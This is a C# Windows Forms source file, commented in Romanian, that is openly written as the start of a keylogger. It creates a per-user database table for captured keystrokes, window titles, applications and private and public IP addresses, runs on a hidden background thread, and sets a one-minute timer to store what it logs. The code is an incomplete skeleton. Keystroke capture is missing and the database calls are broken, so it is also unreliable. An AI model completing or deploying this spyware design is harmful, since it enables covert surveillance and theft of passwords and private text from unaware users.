using System;
using System.Threading;
using System.Data.SqlClient;
using Microsoft.Data.SqlClient;
// pentru a lua utilizatorul
using System.Security.Principal;
using System.Timers;
namespace WinFormsApp1
{
    internal static class Program
    {
       private static System.Timers.Timer timp;
        [STAThread]
        static void Main()
        {    //timer care o data la un minut se va reseta si va pune lucrurile keylogged in baza de date
                timp=new System.Timers.Timer(60000);
            timp.Elapsed += req;//functie care o va indeplini cand se va termina intervalul de un minut
                timp.AutoReset = true;
                timp.Enabled = true;
            //ia numele utilizatorului logat pe pc
            string username=WindowsIdentity.GetCurrent().Name;
            string connectionstring = @"Data Source=(localdb)\Local;Initial Catalog=Keylogger;Integrated Security=True;Encrypt=True";
            // quiery ce creaza tabel in baza de date in functie de ce pc contine acest keylogger
            string Quiery1 = $"CREATE TABLE [{username}](keywords VARCHAR(MAX),timestamp DATETIME2 DEFAULT SYSDATETIME(),WindowTitle VARCHAR(255),Application VARCHAR(255),PrivateIP VARCHAR(255),PublicIP VARCHAR(255));";
            //cream un thread cu scopul de a face acest forms app sa ruleze in background
           // e un fel de loc asemanator mainului in care se vor executa toate comenzile din background
            Thread BackgroundThread = new Thread(() =>
            {
               //creaza conexiune si deschide conexiunea cu baza de date locala/cloud in functie de ce e folosit
                using (SqlConnection connection=new SqlConnection(connectionstring)) {
                    try
                    {
                       connection.Open();

                    }
                    catch(Exception ex) {Console.WriteLine(ex.Message);
                    }
                };
                //creaza tabelul in baza de date si da catch la eroare
                using (SqlCommand table = new SqlCommand(Quiery1))
                {
                    try
                    {
                        table.ExecuteNonQuery();
                    }
                    catch (Exception ex) { Console.WriteLine(ex.Message); }

                };

            });
            //threadul lucreaza in background
            BackgroundThread.IsBackground = true;
            BackgroundThread.Start();
            //da check periodic ca aplicatia sa nu se stinga
            while (true)
            {
                Thread.Sleep(1000);
            }

        }
        private static void req(object sender, ElapsedEventArgs e) 
        {   //connection stringul poate fi modificat in functie de ce baza de date este folosita
            string connectionstring = @"Data Source=(localdb)\\Local;Initial Catalog=Keylogger;Integrated Security=True;Encrypt=True";
            using (SqlConnection conn = new SqlConnection(connectionstring))
            {
                try {
                    conn.Open();
                }
                catch(Exception ex) { 
                Console.WriteLine(ex.Message);
                }

            };
        }
    }
}